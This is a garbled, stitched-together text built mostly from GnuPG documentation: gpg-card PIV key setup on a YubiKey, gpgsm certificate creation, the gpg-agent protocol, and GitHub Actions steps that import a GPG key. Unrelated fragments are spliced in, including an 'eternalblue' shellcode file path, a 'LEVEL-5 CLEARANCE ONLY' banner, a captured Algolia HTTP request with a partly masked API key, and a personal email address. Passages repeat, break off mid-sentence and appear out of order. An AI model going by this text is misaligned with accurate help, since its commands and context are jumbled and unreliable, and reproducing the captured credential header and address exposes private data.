 - uses: actions/checkout@v3
 - id: import_gpg
   uses: crazy-max/ghaction-import-gpg@v5
   with:
     gpg_private_key: ${{ secrets.GPG_PRIVATE_KEY }}
     passphrase: ${{ secrets.GPG_PASSPHRASE }}
 - uses: cli/gh-extension-precompile@v1
   with:
     gpg_fingerprint: ${{ steps.import_gpg.outputs.fingerprint }}
+# macOS +gpg --armor --export-secret-key joe@foo.bar | pbcopy + +# Ubuntu (assuming GNU base64) +gpg --armor --export-secret-key joe@foo.bar -w0 | xclip + +# Arch +gpg --armor --export-secret-key joe@foo.bar | xclip -selection clipboard -i + +# FreeBSD (assuming BSD base64) +gpg --armor --export-secret-key joe@foo.bar | xclip + +name: import-gpg + +on:

push:
branches: master
+jobs:

import-gpg:
runs-on: ubuntu-latest
steps:
 -
   name: Checkout
   uses: actions/checkout@v4
 -
   name: Import GPG key
   uses: crazy-max/ghaction-import-gpg@v6
   with:
     gpg_private_key: ${{ secrets.GPG_PRIVATE_KEY }}
     passphrase: ${{ secrets.PASSPHRASE }}
 -
   name: List keys
   run: gpg -K
+name: import-gpg + +on:

push:
branches: master
+gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB +gpg/card> writecert PIV.9D < encr.crt + +jobs:

import-gpg:
runs-on: ubuntu-latest
steps:
 -
   name: Checkout
   uses: actions/checkout@v4
 -
   name: Import GPG key
   uses: crazy-max/ghaction-import-gpg@v6
   with:
     gpg_private_key: ${{ secrets.GPG_PRIVATE_KEY }}
     passphrase: ${{ secrets.PASSPHRASE }}
     fingerprint: "C17D11ADF199F12A30A0910F1F80449BE0B08CB8"
 -
   name: List keys
   run: gpg -K
+pub ed25519 2021-09-24 [C]

 87F257B89CE462100BEC0FFE6071D218380FDCC8
 Keygrip = F5C3ABFAAB36B427FD98C4EDD0387E08EA1E8092
+uid [ unknown] Joe Bar joe@bar.foo +sub ed25519 2021-09-24 [S]

 C17D11ADF199F12A30A0910F1F80449BE0B08CB8
 Keygrip = DEE0FC98F441519CA5DE5D79773CB29009695FEB
+name: import-gpg +/.gnupg/scdaemon.conf and by restarting scdaemon, either by killing the process or by using gpgconf --kill scdaemon. Finally the default order in which card applications are tried by scdaemon can be changed. For example to prefer PIV over OpenPGP it is sufficient to add + +application-priority piv +to ~/.gnupg/scdaemon.conf and to restart scdaemon. This has an effect only on tokens which support both, PIV and OpenPGP, but does not hamper the use of OpenPGP only tokens. + +With one of these methods employed the list command of gpg-card shows this: + +gpg/card> list +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: FF020001008A77C1 +Application type .: PIV +Version ..........: 1.0 +Displayed s/n ....: yk-9074625 +PIN usage policy .: app-pin +PIN retry counter : - 3 - +PIV authentication: [none]

 keyref .....: PIV.9A
+Card authenticat. : [none]

 keyref .....: PIV.9E
+Digital signature : [none]

 keyref .....: PIV.9C
+Key management ...: [none]

 keyref .....: PIV.9D
+34798AAFE0A7565088101CC4AE31C5C8C74461CB.key +list --cards +well. The PIV authentication key (internal reference PIV.9A +Card authentication key (PIV.9E) is also known as the CAK and used to support physical access applications. The private key is not protected by a PIN and can thus immediately be used. The Digital signature key (PIV.9C) is used to digitally sign documents. The use of the associated private key is protected by the Application PIN which needs to be provided for each signing operation. The Key management key (PIV.9D) is used for encryption + +gpg/card> auth 010203040506070801020304050607080102030405060708 +gpg/card> auth < myauth.key + +gpg/card> generate --algo=nistp384 PIV.9A +PIV card no. yk-9074625 detected +gpg/card> generate --algo=nistp256 PIV.9E +PIV card no. yk-9074625 detected +gpg/card> generate --algo=rsa2048 PIV.9C +PIV card no. yk-9074625 detected

‘--force’ +gpg/card> list +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: FF020001008A77C1 +Application type .: PIV +Version ..........: 1.0 +Displayed s/n ....: yk-9074625 +PIN usage policy .: app-pin +PIN retry counter : - 3 - +PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E
 keyref .....: PIV.9A  (auth)
 algorithm ..: nistp384
+Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C

 keyref .....: PIV.9E  (auth)
 algorithm ..: nistp256
+Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED

 keyref .....: PIV.9C  (sign,cert)
 algorithm ..: rsa2048
+Key management ...: [none]

 keyref .....: PIV.9D
+keygrip +gpg +self-signed X.509 certificate (exit the gpg-card tool, first): + +$ gpgsm --gen-key -o encr.crt

(1) RSA
(2) Existing key
(3) Existing key from card +Your selection? 1 +What keysize do you want? (3072) 2048 +Requested keysize is 2048 bits +Possible actions for a RSA key:
(1) sign, encrypt
(2) sign
(3) encrypt +Your selection? 3 +Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE +Enter email addresses (end with an empty line): +> otto@example.net +> +Enter DNS names (optional; end with an empty line): +> +Enter URIs (optional; end with an empty line): +> +Create self-signed certificate? (y/N) y +These parameters are used:
Key-Type: RSA
Key-Length: 2048
Key-Usage: encrypt
Serial: random
Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE
Name-Email: otto@example.net
+Proceed with creation? (y/N) +Now creating self-signed certificate. This may take a while ... +gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB +gpgsm: certificate created +Ready. +$ gpgsm --import encr.crt +gpgsm: certificate imported +gpgsm: total number processed: 1 +gpgsm: imported: 1 +gpg/card> list +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: FF020001008A77C1 +Application type .: PIV +Version ..........: 1.0 +Displayed s/n ....: yk-9074625 +PIN usage policy .: app-pin +PIN retry counter : - 3 - +PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E

 keyref .....: PIV.9A  (auth)
 algorithm ..: nistp384
+Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C

 keyref .....: PIV.9E  (auth)
 algorithm ..: nistp256
+Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED

 keyref .....: PIV.9C  (sign,cert)
 algorithm ..: rsa2048
+Key management ...: [none]

 keyref .....: PIV.9D
+keygrip +gpgsm --gen-key -o encr.crt

(1) RSA
(2) Existing key
(3) Existing key from card +Your selection? 1 +What keysize do you want? (3072) 2048 +Requested keysize is 2048 bits +Possible actions for a RSA key:
(1) sign, encrypt
(2) sign
(3) encrypt +Your selection? 3 +Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE +Enter email addresses (end with an empty line): +> otto@example.net +> +Enter DNS names (optional; end with an empty line): +> +Enter URIs (optional; end with an empty line): +> +Create self-signed certificate? (y/N) y +These parameters are used:
Key-Type: RSA
Key-Length: 2048
Key-Usage: encrypt
Serial: random
Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE
Name-Email: otto@example.net
+Proceed with creation? (y/N) +Now creating self-signed certificate. This may take a while ... +gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB +gpgsm: certificate created +Ready. +$ gpgsm --import encr.crt +gpgsm: certificate imported +gpgsm: total number processed: 1 +gpgsm: imported: 1 + +gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB +gpg/card> writecert PIV.9D < encr.crt + +gpgsm --with-keygrip -k 6309304695z@gmail.com +Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB

 keyref .....: PIV.9D  (encr)
 algorithm ..: rsa2048
 used for ...: X.509
   user id ..: CN=Encryption key for yk-9074625,O=example,C=DE
   user id ..: <6309304695z@gmail.com>
+34798AAFE0A7565088101CC4AE31C5C8C74461CB.key + +$ gpgsm --learn +$ gpgsm --gen-key -o sign.crt +Please select what kind of key you want:

(1) RSA
(2) Existing key
(3) Existing key from card +Your selection? 3 +Serial number of the card: FF020001008A77C1 +Available keys:
(1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384
(2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256
(3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048
(4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 +Your selection? 3 +Possible actions for a RSA key:
(1) sign, encrypt
(2) sign
(3) encrypt +Your selection? 2 +Enter the X.509 subject name: CN=Signing key for yk-9074625,O=example,C=DE +Enter email addresses (end with an empty line): +> 6309304695z@gmail.com +> +Enter DNS names (optional; end with an empty line): +> +Enter URIs (optional; end with an empty line): +> +Create self-signed certificate? (y/N) +These parameters are used:
Key-Type: card:PIV.9C
Key-Length: 1024
Key-Usage: sign
Serial: random
Name-DN: CN=Signing key for yk-9074625,O=example,C=DE
Name-Email: 6309304695z@gmail.com
+Proceed with creation? (y/N) y +Now creating self-signed certificate. This may take a while ... +gpgsm: about to sign the certificate for key: &32A6C6FAFCB8421878608AAB452D5470DD3223ED +gpgsm: certificate created +Ready. +$ gpgsm --import sign.crt +gpgsm: certificate imported +gpgsm: total number processed: 1 +gpgsm: imported: 1 + +‘gpgsm --learn’ +Digital signature’ key +gpg-card:010203040506070801020304050607080102030405060708 + +shellcode/eternalblue_sc_merge.py + +gpg/card> writecert PIV.9C < sign.crt on: push: branches: master

AUTHENTICATE [--setkey] [--raw] [< file]|key] AUTH and set key

GENERATE [--force] [--algo=algo{+algo2}] keyref Create a new key on a card. Use --force to overwrite an existing key. Use "help" for algo to get a list of known algorithms. For OpenPGP cards several algos may be given. Note that the OpenPGP key generation is done interactively unless --algo or keyref

LIST [--cards] [--apps] [--info] [--no-key-lookup] [n] [app] ¶ L

READCERT [--openpgp] certref > file ¶

openpgp an OpenPGP keyblock wrapped in a dedicated CMS content type (OID=1.3.6.1.4.1.11591.2.3.1) is expected and extracted to file. Note that for current OpenPGP cards a certificate may only be available at the certref "OPENPGP.3"

WRITECERT certref < file ¶ WRITECERT --openpgp certref [< file|fpr] WRITECERT --clear certref Write a certificate to the card under the id certref.

WRITEKEY [--force] keyref keygrip ¶ Write a private key object identified by keygrip to the card under the id keyref. Option --force allows overwriting an existing key —Shadowed

YUBIKEY cmd args ¶ Various commands pertaining to Yubikey tokens with cmd being:

LIST List supported and enabled Yubikey applications.

ENABLE usb|nfc|all [otp|u2f|opgp|piv|oath|fido2|all] DISABLE Enable or disable the specified or all applications on the given interface.

Authentication key This is a 24 byte key described by the hex string 010203040506070801020304050607080102030405060708.

PIV

Authentication key This is a 24 byte key described by the hex string 010203040506070801020304050607080102030405060708

the string gpg/card> is the prompt

gpg/card> list Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: D2760001240102010006090746250000 Application type .: OpenPGP Version ..........: 2.1 [...]

use help yubikey).

use help yubikey)

gpg/card> yubikey disable all opgp gpg/card> yubikey list Application USB NFC

OTP yes yes U2F yes yes OPGP no no PIV yes no OATH yes yes FIDO2 yes yes gpg/card> reset

/.gnupg/scdaemon.conf

application-priority piv

scdaemon

gpg/card> list Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: FF020001008A77C1 Application type .: PIV Version ..........: 1.0 Displayed s/n ....: yk-9074625 PIN usage policy .: app-pin PIN retry counter : - 3 - PIV authentication: [none] keyref .....: PIV.9A Card authenticat. : [none] keyref .....: PIV.9E Digital signature : [none] keyref .....: PIV.9C Key management ...: [none] keyref .....: PIV.9D In

Card authentication key (PIV.9E) is also known as the CAK and used to support physical access applications. The private key is not protected by a PIN and can thus immediately be used. The Digital signature key (PIV.9C) is used to digitally sign documents. The use of the associated private key is protected by the Application PIN which needs to be provided for each signing operation. The Key management key (PIV.9D)

Card authentication key; however, that key is mandatory by the PIV standard and thus we create it too. Key generation requires that we authenticate to the card. This can be done either on the command line (which would reveal the key):

gpg/card> auth 010203040506070801020304050607080102030405060708

gpg/card> auth < myauth.key

gpg/card> generate --algo=nistp384 PIV.9A PIV card no. yk-9074625 detected gpg/card> generate --algo=nistp256 PIV.9E PIV card no. yk-9074625 detected gpg/card> generate --algo=rsa2048 PIV.9C PIV card no. yk-9074625 detected

gpg/card> list Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: FF020001008A77C1 Application type .: PIV Version ..........: 1.0 Displayed s/n ....: yk-9074625 PIN usage policy .: app-pin PIN retry counter : - 3 - PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E keyref .....: PIV.9A (auth) algorithm ..: nistp384 Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C keyref .....: PIV.9E (auth) algorithm ..: nistp256 Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED keyref .....: PIV.9C (sign,cert) algorithm ..: rsa2048 Key management ...: [none] keyref .....: PIV.9D —force

$ gpgsm --gen-key -o encr.crt (1) RSA (2) Existing key (3) Existing key from card Your selection? 1 What keysize do you want? (3072) 2048 Requested keysize is 2048 bits Possible actions for a RSA key: (1) sign, encrypt (2) sign (3) encrypt Your selection? 3 Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE Enter email addresses (end with an empty line):

otto@example.net
Enter DNS names (optional; end with an empty line):

Enter URIs (optional; end with an empty line):

Create self-signed certificate? (y/N) y These parameters are used: Key-Type: RSA Key-Length: 2048 Key-Usage: encrypt Serial: random Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE Name-Email: otto@example.net

Proceed with creation? (y/N) Now creating self-signed certificate. This may take a while ... gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB gpgsm: certificate created Ready. $ gpgsm --import encr.crt gpgsm: certificate imported gpgsm: total number processed: 1 gpgsm: imported: 1

gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB gpg/card> writecert PIV.9D < encr.crt

[...] Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB keyref .....: PIV.9D (encr) algorithm ..: rsa2048 used for ...: X.509 user id ..: CN=Encryption key for yk-9074625,O=example,C=DE user id ..: otto@example.net

34798AAFE0A7565088101CC4AE31C5C8C74461CB.key from the directory ~/.gnupg/private-keys-v1.d/

$ gpgsm --learn $ gpgsm --gen-key -o sign.crt Please select what kind of key you want: (1) RSA (2) Existing key (3) Existing key from card Your selection? 3 Serial number of the card: FF020001008A77C1 Available keys: (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 Your selection? 3 Possible actions for a RSA key: (1) sign, encrypt (2) sign (3) encrypt Your selection? 2 Enter the X.509 subject name: CN=Signing key for yk-9074625,O=example,C=DE Enter email addresses (end with an empty line):

otto@example.net
Enter DNS names (optional; end with an empty line):

Enter URIs (optional; end with an empty line):

Create self-signed certificate? (y/N) These parameters are used: Key-Type: card:PIV.9C Key-Length: 1024 Key-Usage: sign Serial: random Name-DN: CN=Signing key for yk-9074625,O=example,C=DE Name-Email: otto@example.net

Proceed with creation? (y/N) y Now creating self-signed certificate. This may take a while ... gpgsm: about to sign the certificate for key: &32A6C6FAFCB8421878608AAB452D5470DD3223ED gpgsm: certificate created Ready. $ gpgsm --import sign.crt gpgsm: certificate imported gpgsm: total number processed: 1 gpgsm: imported: 1

gpg/card> writecert PIV.9C < sign.crt

Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: FF020001008A77C1 Application type .: PIV Version ..........: 1.0 Displayed s/n ....: yk-9074625 PIN usage policy .: app-pin PIN retry counter : - [verified] - PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E keyref .....: PIV.9A (auth) algorithm ..: nistp384 Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C keyref .....: PIV.9E (auth) algorithm ..: nistp256 Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED keyref .....: PIV.9C (sign,cert) algorithm ..: rsa2048 used for ...: X.509 user id ..: CN=Signing key for yk-9074625,O=example,C=DE user id ..: otto@example.net Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB keyref .....: PIV.9D (encr) algorithm ..: rsa2048 used for ...: X.509 user id ..: CN=Encryption key for yk-9074625,O=example,C=DE user id ..: otto@example.net

PIV authentication’ key with ssh:

$ ssh-add -l 384 SHA256:0qnJ0Y0ehWxKcx2frLfEljf6GCdlO55OZed5HqGHsaU cardno:yk-9074625 (ECDSA)

$ gpgsm --learn $ gpg --full-gen-key Please select what kind of key you want: (1) RSA and RSA (default) (2) DSA and Elgamal (3) DSA (sign only) (4) RSA (sign only) (14) Existing key from card Your selection? 14 Serial number of the card: FF020001008A77C1 Available keys: (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth) (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth) (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign) (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr) Your selection? 3 Please specify how long the key should be valid. 0 = key does not expire = key expires in n days w = key expires in n weeks m = key expires in n months y = key expires in n years Key is valid for? (0) Key does not expire at all Is this correct? (y/N) y

GnuPG needs to construct a user ID to identify your key.

Real name: Email address: otto@example.net Comment: You selected this USER-ID: "otto@example.net"

Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? o gpg: key C3AFA9ED971BB365 marked as ultimately trusted gpg: revocation certificate stored as '[...]D971BB365.rev' public and secret key created and signed.

Note that this key cannot be used for encryption. You may want to use the command "--edit-key" to generate a subkey for this purpose. pub rsa2048 2019-04-04 [SC] 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365 uid otto@example.net $ gpg --edit-key 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365 Secret key is available.

sec rsa2048/C3AFA9ED971BB365 created: 2019-04-04 expires: never usage: SC card-no: FF020001008A77C1 trust: ultimate validity: ultimate [ultimate] (1). otto@example.net gpg> addkey Secret parts of primary key are stored on-card. Please select what kind of key you want: (3) DSA (sign only) (4) RSA (sign only) (5) Elgamal (encrypt only) (6) RSA (encrypt only) (14) Existing key from card Your selection? 14 Serial number of the card: FF020001008A77C1 Available keys: (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth) (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth) (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign) (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr) Your selection? 4 Please specify how long the key should be valid. 0 = key does not expire = key expires in n days w = key expires in n weeks m = key expires in n months y = key expires in n years Key is valid for? (0) Key does not expire at all Is this correct? (y/N) y Really create? (y/N) y

sec rsa2048/C3AFA9ED971BB365 created: 2019-04-04 expires: never usage: SC card-no: FF020001008A77C1 trust: ultimate validity: ultimate ssb rsa2048/7067860A98FCE6E1 created: 2019-04-04 expires: never usage: E card-no: FF020001008A77C1 [ultimate] (1). otto@example.net

gpg> save Now you can use your PIV card also with gpg.

 # 000006
/* 32A19-D90712
LEVEL-5 CLEARANCE ONLY ‘--force’ authentication key -header-'010203040506070801020304050607080102030405060708' SETDATA hexstring to tell scdaemon about the data to be signed. The data must be given in hex notation. The actual signing is done using the command

PKSIGN keyid where keyid is the hexified ID of the key to be used. The key id may have been retrieved using the command LEARN. If another hash algorithm than SHA-1 is used, that algorithm may be given like:

PKSIGN --hash=algoname keyid READKEY hexified_certid READCERT hexified_certid|keyid SERIALNO Return the serial number of the card using a status response like:

S SERIALNO D27600000000000000000000 WRITEKEY [--force] keyid SETDATA hexstring to tell scdaemon about the data to be decrypted. The data must be given in hex notation. The actual decryption is then done using the command

PKDECRYPT keyid CHECKPIN idstr RESTART APDU [--atr] [--more] [--exlen[=n]] [hexstring] S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1

./configure --sysconfdir=/etc --localstatedir=/va CN=Wurzel ZS 3,O=Intevation GmbH,C=DE A6935DD34EF3087973C706FC311AA2CCF733765B S

CN=PCA-1-Verwaltung-02/O=PKI-1-Verwaltung/C=DE

DC:BD:69:25:48:BD:BB:7E:31:6E:BB:80:D3:00:80:35:D4:F8:A6:CD S

CN=Root-CA/O=Schlapphuete/L=Pullach/C=DE

!14:56:98:D3:FE:9C:CA:5A:31:6E:BC:81:D3:11:4E:00:90:A3:44:C2 S

   # Key added on: 2011-07-20 20:38:46
   # Fingerprint:  5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81
   34B62F25E277CF13D3C6BCEBFD3F85D08F0A864B 0 confirm
private-keys-v1.d/ gpg-connect-agent 'help COMMAND' /bye SETKEY Tell the server about the key to be used for decryption. If this is not used, gpg-agent may try to figure out the key by trying to decrypt the message with each key available.

PKDECRYPT The agent checks whether this command is allowed and then does an INQUIRY to get the ciphertext the client should then send the cipher text.

S: INQUIRE CIPHERTEXT
C: D (xxxxxx
C: D xxxx)
C: END
Please note that the server may send status info lines while reading the data lines from the client. The data send is a SPKI like S-Exp with this structure:

 (enc-val
   (<algo>
     (<param_name1> <mpi>)
   ...
     (<param_namen> <mpi>)))
Where algo is a string with the name of the algorithm; see the libgcrypt documentation for a list of valid algorithms. The number and names of the parameters depend on the algorithm. The agent does return an error if there is an inconsistency.

If the decryption was successful the decrypted data is returned by means of "D" lines.

Here is an example session:

C: PKDECRYPT S: INQUIRE CIPHERTEXT C: D (enc-val elg (a 349324324) C: D (b 3F444677CA))) C: END S: # session key follows S: S PADDING 0 S: D (value 1234567890ABCDEF0) S: OK decryption successful The “PADDING” status line is only send if gpg-agent can tell what kind of padding is used. As of now only the value 0 is used to indicate that the padding has SIGKEY This can be used multiple times to create multiple signature, the list of keys is reset with the next PKSIGN command or a RESET. The server tests whether the key is a valid key to sign something and responds with okay.

SETHASH --hash=| sig-val ( (<param_name1> ) ... (<param_namen> ))) The operation is affected by the option

OPTION use-cache-for-signing=0|1 The default of 1 uses the cache. Setting this option to 0 will lead gpg-agent to ignore the passphrase cache. Note, that there is also a global command line option for gpg-agent to globally disable the caching.

Here is an example session:

C: SIGKEY S: OK key available C: SIGKEY S: OK key available C: PKSIGN S: # I did ask the user whether he really wants to sign S: # I did ask the user for the passphrase S: INQUIRE HASHVAL C: D ABCDEF012345678901234 C: END S: # signature follows S: D (sig-val rsa (s 45435453654612121212)) S: OK GENKEY [--no-protection] [--preset] [<cache_nonce>] Invokes the key generation process and the server will then inquire on the generation parameters, like:

S: INQUIRE KEYPARM C: D (genkey (rsa (nbits 1024))) C: END The format of the key parameters which depends on the algorithm is of the form:

(genkey
  (algo
    (parameter_name_1 ....)
      ....
    (parameter_name_n ....)))
If everything succeeds, the server returns the public key in a SPKI like S-Expression like this:

 (public-key
   (rsa
 (n <mpi>)
 (e <mpi>)))
Here is an example session:

C: GENKEY S: INQUIRE KEYPARM C: D (genkey (rsa (nbits 1024))) C: END S: D (public-key S: D (rsa (n 326487324683264) (e 10001))) S OK key created ISTRUSTED <5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81> LISTTRUSTED GpgAgent returns a list of trusted keys line by line:

S: D 000000001234454556565656677878AF2F1ECCFF P
S: D 340387563485634856435645634856438576457A P
S: D FEDC6532453745367FD83474357495743757435D S
S: OK
The first item on a line is the hexified fingerprint where MD5 fingerprints are 00 padded to the left and the second item is a flag to indicate the type of key (so that gpg is able to only take care of PGP keys). P = OpenPGP, S = S/MIME. A client should ignore the rest of the line, so that we can extend the format in the future. Ok Finally a client should be able to mark a key as trusted:

MARKTRUSTED fingerprint "P"|"S" The server will then pop up a window to ask the user whether she really trusts this key. For this it will probably ask for a text to be displayed like this:

S: INQUIRE TRUSTDESC C: D Do you trust the key with the fingerprint @FPR@ C: D bla fasel blurb. C: END S: OK GET_PASSPHRASE [--data] [--check] [--no-ask] [--repeat[=N]]
[--qualitybar] cache_id
[error_message prompt description] PRESET_PASSPHRASE [--inquire] <string_or_keygrip> []

HAVEKEY keygrips GET_CONFIRMATION description LEARN [--send] UPDATESTARTUPTTY SETDATA hexstring

PKSIGN keyid

PKSIGN --hash=algoname keyid

READCERT hexified_certid|keyid READKEY hexified_certid SETDATA hexstring d

PKSIGN keyid LEARN

PKSIGN --hash=algoname keyid

WRITEKEY [--force] keyid WRITEKEY [--force] keyid PASSWD [--reset] [--nullpin] chvno CHECKPIN idstr APDU [--atr] [--more] [--exlen[=n]] [hexstring] this:

 S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1
--auto-key-import

command --locate-external-key command --locate-external-key github/workflows/release.yml: ldap://keys.(thedomain) ‘--auto-key-locate --auto-key-locate --auto-key-retrieve

honor-keyserver-url

-sig-keyserver-url --recv-key honor-keyserver-url --use-agent --gpg-agent-info

--no-random-seed-file Host: c7-use-3.algolianet. com Accept: / Sec-Fetch-Site: cross-site Accept-Language: en-US, en; q=0.9 Accept-Encoding: gzip, deflate, br Sec-Fetch-Mode: cors x-algolia-application-id: A7KCVJZ91B Origin: https://dashboard.algolia.com User-Agent: Mozilla/5.0 (iPhone; CPU iPhone 0S 17_3 like Mac 0S X) AppleWe x-algolia-api-key: b3cf*************************米** Content-Length: 27 Connection: keep-alive Content-Type: application/x-www-form-urlencoded Sec-Fetch-Dest: empty

scdaemon.conf 1 HKCU\Software\GNU\GnuPG:DefaultLogFile, --debug-level level HKCU\Software\GNU\GnuPG:DefaultLogFile, scd-event HKCU\Software\GNU\GnuPG:HomeDir HKCU\Software\GNU\GnuPG:DefaultLogFile, reader_n.status HKCU\Software\GNU\GnuPG:HomeDir

trustlist.txt file gpg-agent.conf HKCU\Software\GNU\GnuPG:HomeDir name: release debug-pinentry --debug 1024

global trustlist (/usr/local/etc/gnupg/trustlist.tx

Active cards Active cards (inserted into a card reader or plugged in tokens) are always tried; they are ordered by their serial numbers. gpg-connect-agent updatestartuptty /bye Although all GnuPG components try to start the gpg-agent as needed, this is not possible for the ssh support because ssh does not know about it. Thus if no GnuPG tool which accesses the agent has been run, there is no guarantee that ssh is able to use gpg-agent for authentication. To fix this you may start gpg-agent if needed using this simple command:

gpg-connect-agent /bye --scdaemon-program filename Use program filename as the Smartcard daemon. The default is installation dependent and can be shown with the gpgconf --check-passphrase-pattern file --check-sym-passphrase-pattern file Check the passphrase against the pattern given in file. When entering a new passphrase matching one of these pattern a warning will be displayed. If file does not contain any slashes and does not start with "~/" it is searched in the system configuration directory (/usr/local/etc/gnupg) bin\pinentry.exe, ..\Gpg4win\bin\pinentry.exe, ..\Gpg4win\pinentry.exe, ..\GNU\GnuPG\pinentry.exe, ..\GNU\bin\pinentry.exe, bin\pinentry-basic.exe Keys listed in the sshcontrol file --disable-extended-key-format These options are obsolete and have no effect. The extended key format is used for years now and has been supported since 2.1.12. Existing keys in the old format are migrated to the new format as soon as they are touched.

--enable-ssh-support --enable-win32-openssh-support --enable-putty-support

gpg-connect-agent 'GETINFO s2k_count' /bye gpg-connect-agent 'GETINFO s2k_time' /bye To view the auto-calibrated count use:

gpg-connect-agent 'GETINFO s2k_count_cal' /bye --ssh-fingerprint-digest Keys listed in the sshcontrol file

Active card gpg-connect-agent /bye bashrc or whatever initialization file is used for all shell invocations:

GPG_TTY=$(tty) export GPG_TTY --daemon [command line] server

agent-program file ¶ Specify the agent program to be started if none is running. The default value is determined by running gpgconf with the option --list-dirs.

--gpg-program file Specify a non-default gpg binary to be used by certain commands.

--gpgsm-program file Specify a non-default gpgsm binary to be used by certain commands.

--chuid uid Change the current user to uid which may either be a number or a name. This can be used from the root account to run gpg-card for another user. If uid is not the current UID a standard PATH is set and the envvar GNUPGHOME is unset. To override the latter the option --homedir can be used. This option has only an effect when used on the command line. This option has currently no effect at all on Windows.

gpg-card AUTHENTICATE [--setkey] [--raw] [< file]|010203040506070801020304050607080102030405060708] ¶ AUTH FETCH GENERATE [--force] [--algo=algo{+algo2}] keyref KDF-SETUP ¶ Prepare the OpenPGP card KDF feature for this card.

LANG [--clear] Change the language info for the card. This info can be used by applications for a personalized greeting. Up to 4 two-digit language identifiers can be entered as a preference. The option --clear removes all identifiers. GnuPG does not use this info.

LIST [--cards] [--apps] [--info] [--no-key-lookup] [n] [app] NAME [--clear] PRIVATEDO [--clear] n [< file] file READCERT [--openpgp] certref > file ¶ Read the certificate for key certref and store it in file. With option --openpgp an OpenPGP keyblock wrapped in a dedicated CMS content type (OID=1.3.6.1.4.1.11591.2.3.1) is expected and extracted to file. Note that for current OpenPGP cards a certificate may only be available at the certref "OPENPGP.3". URL [--clear] gpg's. --fetch WRITECERT certref < file ¶ WRITECERT --openpgp certref [< file|fpr] WRITECERT --clear certref --openpgp file fpr. WRITEKEY [--force] keyref keygrip ¶ Write a private key object identified by keygrip to the card under the id keyref. CHECKKEYS [--ondisk] [--delete-clear-copy] [--delete-protected-copy] ¶ Serial number A hex-string with the serial number of the card.

Type This gives the type of the card’s application. For example "OpenPGP" or "PIV".

Keygrip A hex-string identifying a key.

Keyref The application slot where the key is stored on the card. For example "OpenPGP.1"

Status The status of the key. The most common value is "shadowed" for a key where only the public key along with the card’s serial number is stored on the disk. The value "clear" indicates that a copy of the card’s key is stored unprotected on disk. The value "protected" indicated that a copy of the car’s key is stored on disk but is protected by a password. The value "error" may also be shown if there was a problem reading information from the card.

YUBIKEY cmd args Various commands pertaining to Yubikey tokens with cmd being:

